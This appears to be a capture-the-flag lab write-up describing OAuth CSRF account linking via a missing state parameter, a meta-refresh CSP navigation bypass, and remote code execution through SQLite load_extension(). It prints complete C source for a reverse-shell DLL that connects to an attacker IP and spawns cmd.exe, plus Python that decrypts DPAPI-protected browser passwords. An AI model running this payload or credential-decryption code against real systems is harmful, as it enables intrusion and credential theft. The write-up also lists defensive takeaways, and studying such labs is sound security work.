Phase 2 — OAuth Account Takeover

Vulnerability Analysis
OAuth 2.0 CSRF — Missing State Parameter
Blind Account Linking + Admin Bot Navigation
The OAuth authorize redirect to Qooqle lacks a cryptographic state nonce, enabling CSRF. The callback endpoint /accounts/oauth2/qooqle/callback/?code=... automatically links the Qooqle account to whichever Eloquia user’s session consumes the code. An admin bot visits reported articles, and CSP’s default-src 'self' restricts resource loading — but not page navigation, so <meta http-equiv="refresh"> redirects to external URLs are allowed.
#FlawImpact
1Missing OAuth state parameterEnables CSRF-based account linking
2Blind account linking on callbackAny session consuming the code gets the Qooqle identity attached
3Admin bot follows meta refresh to external URLsAllows redirecting admin session to attacker-controlled endpoint
4Short code TTL (~10-15s)Bypassed by generating a fresh code on-demand from attacker server

Phase 3 — SQLite RCE via load_extension()

SQLite load_extension() — Arbitrary DLL Loading
Django SQL Explorer → load_extension() → Reverse Shell DLL
The Django admin SQL Explorer plugin executes raw SQLite queries. With load_extension() enabled, any path to a DLL can be loaded and executed in the context of the web process. An uploaded DLL (disguised as a banner image) is triggered via a crafted SQL query.
Reverse Shell DLL (sqlite_revshell.c)
c — sqlite_revshell.c
#include <winsock2.h>
#include <windows.h>

#define ATTACKER_IP   "10.10.14.76"
#define ATTACKER_PORT  9001

__declspec(dllexport) int sqlite3_extension_init(
    void *db, char **pzErrMsg, void *pApi) { return 0; }

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    if (reason == DLL_PROCESS_ATTACH) {
        WSADATA wd; SOCKET s; struct sockaddr_in a;
        STARTUPINFOA si; PROCESS_INFORMATION pi;

        WSAStartup(MAKEWORD(2,2), &wd);
        s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        a.sin_family      = AF_INET;
        a.sin_port        = htons(ATTACKER_PORT);
        a.sin_addr.s_addr = inet_addr(ATTACKER_IP);

        if (connect(s, (struct sockaddr*)&a, sizeof(a)) == 0) {
            memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
            si.dwFlags = STARTF_USESTDHANDLES;
            si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
            CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE,
                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        }
    }
    return TRUE;
}

from Crypto.Cipher import AES

master_key = bytes.fromhex('c7f1ad7b079947b4bb1dc53b8740440651b6c9f5caf7fd9a18bbece57c7bd444')

def decrypt_password(enc, key):
    iv      = enc[3:15]      # Skip "v10" prefix
    payload = enc[15:-16]
    tag     = enc[-16:]
    cipher  = AES.new(key, AES.MODE_GCM, nonce=iv)
    return cipher.decrypt_and_verify(payload, tag).decode('utf-8')

Key Takeaways

01
OAuth CSRF via Missing State Parameter
Always implement and verify the state parameter in OAuth flows. A missing nonce enables CSRF-based account linking against any session that visits the callback URL.
02
Meta Refresh Bypasses CSP Navigation
CSP default-src 'self' restricts resource loading — not page navigation. A Flask callback server generating fresh codes on-demand defeats short OAuth code TTLs (~10-15 seconds).
03
SQLite load_extension() is Dangerous
If enabled, it allows arbitrary DLL loading — effectively granting RCE through any interface that can execute SQL queries. Disable it in production.
04
AppLocker Bypass via DLL Loading
While AppLocker blocked executables and PowerShell, DLL loading through SQLite extensions was unrestricted. DPAPI decryption required running code on-target as the owning user, bypassing offline approaches.
05
Weak Service Binary Permissions
The Failure2Ban service executable was writable by a regular user while running as SYSTEM. This classic insecure service permission vulnerability grants trivial privilege escalation.
06
Browser Credential Storage as Lateral Movement Target
Edge/Chrome saved passwords encrypted with DPAPI can be decrypted by any process running as the owning user — making browser profiles a high-value target on any compromised host.
